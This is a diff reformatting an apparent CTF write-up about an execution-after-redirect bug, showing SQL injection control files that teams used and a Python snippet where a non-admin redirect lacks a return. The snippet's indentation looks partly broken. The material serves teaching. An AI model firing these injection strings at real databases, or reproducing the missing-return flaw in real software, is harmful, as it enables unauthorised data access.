@@ -117,31 +117,42 @@ The secret is:
 
 The 8 successful control files sent over the course of the competition were:
 
-`a\n50\ninfo 'OR(1)LIMIT/**/5,1--\n zzyzx\n83\ninfo '/**/OR/**/pass<83;/*\n a\n50\ninfo 0'/**/or/**/pass='66\n zzyzx\n83\ninfo root'OR'1'='1'LIMIT'5','1\n user\n50\ninfo ab'or/**/oid=6;--\n a\n50\ninfo '/**/or/**/oid=6;--\n zzyzx\n83\ninfo '/**/or/**/user/**/like's% zzyzx\n83\ninfo 'OR(user='secret')--\n`
+    :::text
+    a\n50\ninfo 'OR(1)LIMIT/**/5,1--\n
+    zzyzx\n83\ninfo '/**/OR/**/pass<83;/*\n
+    a\n50\ninfo 0'/**/or/**/pass='66\n
+    zzyzx\n83\ninfo root'OR'1'='1'LIMIT'5','1\n
+    user\n50\ninfo ab'or/**/oid=6;--\n
+    a\n50\ninfo '/**/or/**/oid=6;--\n
+    zzyzx\n83\ninfo '/**/or/**/user/**/like's%
+    zzyzx\n83\ninfo 'OR(user='secret')--\n
 
-My own control file used in testing:  
-`a\n50\ninfo z'or"user"='secret`
+My own control file used in testing:
+
+    :::text
+    a\n50\ninfo z'or"user"='secret
 
 I think the fact that just over one third of the teams in our hacking
 competition discovered this vulnerability shows how dangerous it can be, and
 hence the title, Fear the EAR.
 
-            conn = sqlite3.connect(DATABASE)
-            try:
-                c = conn.execute('select * from users where user=?', (user,))
-                result = c.fetchone()
-            if not result:
-            return self.send_redirect(S['nonexist'] % user)
-                _, user_pswd, info, is_admin, is_active = result
-                if pswd != user_pswd:
-                    return self.send_redirect(S['mismatch'] % user)
-                if not is_active:
-                    return self.send_redirect(S['inactive'] % user)
-                if not is_admin:
-                    self.send_redirect(S['admin'] % user)
-                self.process_command(conn, user, *cmd.split(' '))
-            finally:
-                conn.close()
+    :::python
+    conn = sqlite3.connect(DATABASE)
+    try:
+        c = conn.execute('select * from users where user=?', (user,))
+        result = c.fetchone()
+    if not result:
+    return self.send_redirect(S['nonexist'] % user)
+        _, user_pswd, info, is_admin, is_active = result
+        if pswd != user_pswd:
+            return self.send_redirect(S['mismatch'] % user)
+        if not is_active:
+            return self.send_redirect(S['inactive'] % user)
+        if not is_admin:
+            self.send_redirect(S['admin'] % user)
+        self.process_command(conn, user, *cmd.split(' '))
+    finally:
+        conn.close()
 
 You can find the complete source code for this challenge [here][]. It simply
 requires running a single python file. The bug in the code that produces the
